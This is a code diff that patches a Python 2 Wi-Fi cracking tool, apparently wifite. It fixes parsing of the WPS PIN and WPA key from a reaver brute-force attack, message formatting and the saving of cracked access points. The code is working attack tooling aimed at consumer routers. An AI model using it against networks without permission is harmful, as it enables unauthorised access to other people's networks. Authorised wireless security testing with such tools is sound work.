@@ -254,7 +254,7 @@ def main():
 					if ri.lower() == 'n':
 						targets.pop(index)
 						index -= 1
-						break
+					break
 
 			# Check if handshakes already exist, ask user whether to skip targets or save new handshakes
 			handshake_file = WPA_HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) \
@@ -471,7 +471,7 @@ def handle_args():
 					
 			elif args[i] == '-cracked':
 				if len(CRACKED_TARGETS) == 0:
-					print R+' [!]'+O+' there are not cracked access points saved to '+R+'cracked.txt'+W
+					print R+' [!]'+O+' there are not cracked access points saved to '+R+'cracked.txt\n'+W
 					exit_gracefully(1)
 				print GR+' [+]'+W+' '+W+'previously cracked access points'+W+':'
 				for victim in CRACKED_TARGETS:
@@ -2422,7 +2422,7 @@ def wps_attack(iface, target):
 	       '-a',  # auto-detect best options, also auto-resumes sessions
 	       '-c', target.channel,
 	       # '--ignore-locks',
-	       '-vv']  # semi-verbose output
+	       '-vv']  # verbose output
 	#print ' '.join(cmd)
 	proc = Popen(cmd, stdout=DN, stderr=DN)
 	cracked = False
@@ -2454,7 +2454,7 @@ def wps_attack(iface, target):
 						if i != -1 and j != -1: aps = line[i+2:j]
 					# PIN attempt
 					elif line.find(' Trying pin ') != -1:
-						pin = line.split(' ')[-1]
+						pin = line.strip().split(' ')[-1]
 						if pin == last_pin: 
 							retries += 1
 						elif attempts == 0:
@@ -2474,30 +2474,30 @@ def wps_attack(iface, target):
 					# Warning
 					elif line.endswith('10 failed connections in a row'):
 						pass
-					
 					# Check for PIN/PSK
 					pin = ''
 					key = ''
 					for line in lines:
 						# When it's cracked:
-						if line.find("[+] WPS PIN: '") != -1:
-							pin = line[14:-1]
-						if line.find("[+] WPA PSK: '") != -1:
-							key = line[14:-1]
+						if line.find("WPS PIN: '") != -1:
+							pin = line[line.find("WPS PIN: '") + 10:-1]
+						if line.find("WPA PSK: '") != -1:
+							key = line[line.find("WPA PSK: '") + 10:-1]
 							cracked = True
 					if cracked: break
 				
 				print ' %s WPS attack, %s tries/atts,' % \
 				            (GR+sec_to_hms(time.time()-time_started)+W, \
 				            G+str(tries)+W+'/'+O+str(attempts)+W),
-
+				
 				if percent == 'x.xx%': print '\r',
 				else:
 					print '%s complete (%s secs/pin)   \r' % (G+percent+W, G+aps+W),
 				
 				stdout.flush()
-				inf = open(temp + 'out.out', 'w')
-				inf.close()
+				# Clear out output file if bigger than 1mb
+				# inf = open(temp + 'out.out', 'w')
+				#inf.close()
 			
 			if proc.poll() != None:
 				# Process stopped: Cracked? Failed? 
@@ -2508,26 +2508,20 @@ def wps_attack(iface, target):
 				key = ''
 				for line in lines:
 					# When it's cracked:
-					if line.find("[+] WPS PIN: '") != -1:
-						pin = line[14:-1]
-					if line.find("[+] WPA PSK: '") != -1:
-						key = line[14:-1]
+					if line.find("WPS PIN: '") != -1:
+						pin = line[line.find("WPS PIN: '") + 10:-1]
+					if line.find("WPA PSK: '") != -1:
+						key = line[line.find("WPA PSK: '") + 10:-1]
 						cracked = True
-				
-				if pin != '': print GR+'\n\n [+]'+G+' PIN found:     %s' % (C+pin+W)
-				if key != '': print GR+' [+] %sWPA key found%s: "%s"' % (G, W, C+key+W)
-				if pin == '' and key == '':
-					copy(temp + 'out.out', 'out.out')
-					print 'copied out.out'
 				break
 		
 		if cracked:
 			if pin != '': print GR+'\n\n [+]'+G+' PIN found:     %s' % (C+pin+W)
-			if key != '': print GR+' [+] %sWPA key found%s: "%s"' % (G, W, C+key+W)
+			if key != '': print GR+' [+] %sWPA key found:%s %s' % (G, W, C+key+W)
 			WPA_FINDINGS.append(W+"found %s's WPA key: \"%s\", WPS PIN: %s" % (G+target.ssid+W, C+key+W, C+pin+W))
 			WPA_FINDINGS.append('')
 
-			save_cracked(target.bssid, "Key is '" + target.ssid, key + "' and PIN is '" + pin + "'", 'WPA')
+			save_cracked(target.bssid, target.ssid, "Key is '" + key + "' and PIN is '" + pin + "'", 'WPA')
 		
 	except KeyboardInterrupt:
 		print R+'\n (^C)'+O+' WPS brute-force attack interrupted'+W
